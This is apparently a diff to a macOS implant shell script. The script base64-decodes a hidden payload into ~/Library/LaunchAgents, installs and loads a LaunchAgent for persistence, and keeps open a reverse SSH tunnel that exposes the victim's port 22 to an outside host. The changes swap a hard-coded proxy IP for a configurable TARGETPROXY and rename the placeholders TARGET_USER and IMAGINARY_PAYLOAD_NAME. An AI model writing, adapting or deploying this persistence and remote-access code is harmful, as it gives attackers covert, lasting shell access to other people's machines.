@@ -8,6 +8,7 @@ NAME=$(basename "$0")
 KEY="$HOME/.ssh/PRIVATE_KEY_PATH_PLACEHOLDER"
 FLOCKNAME="FLOCK_NAME_PLACEHOLDER"
 LAGENTNAME="LAGENT_NAME_PLACEHOLDER"
+TARGETPROXY="TARGET_PROXY"
 chmod +x "$NAME"
 
 if ! test -d "$HOME/Library/LaunchAgents/"; then
@@ -24,8 +25,8 @@ if test -f "$KEY";then
         if curl --max-time 3 --output /dev/null --silent --head --fail "http://google.com" ; then 
             $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $KEY flip@FQDN_PLACEHOLDER
             
-        else
-            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ProxyCommand="/usr/bin/nc -X connect -x 10.92.187.53:80 %h %p" -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $KEY flip@FQDN_PLACEHOLDER
+        elif test -n "$TARGETPROXY"; then
+            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ProxyCommand="/usr/bin/nc -X connect -x $TARGETPROXY %h %p" -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $KEY flip@FQDN_PLACEHOLDER
         fi
         sleep 10
     done
@@ -39,8 +40,8 @@ else
     echo "FLOCK_CODE_PLACEHOLDER" |base64 -d > "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
     chmod 600 "$KEY" && chmod 644 "$HOME/.ssh/authorized_keys" && chmod +x "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
     echo "LAGENT_XML_PLACEHOLDER"|base64 -d >$HOME/Library/LaunchAgents/$LAGENTNAME.plist
-    sed -i '' "s/home/${USER}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
-    sed -i '' "s/IMAGINARY_PAYLOAD_NAME.sh/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
+    sed -i '' "s/TARGET_USER/${USER}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
+    sed -i '' "s/IMAGINARY_PAYLOAD_NAME/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
     mv "$NAME" "$HOME/Library/LaunchAgents/"
     launchctl load -w "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
     launchctl start $LAGENTNAME
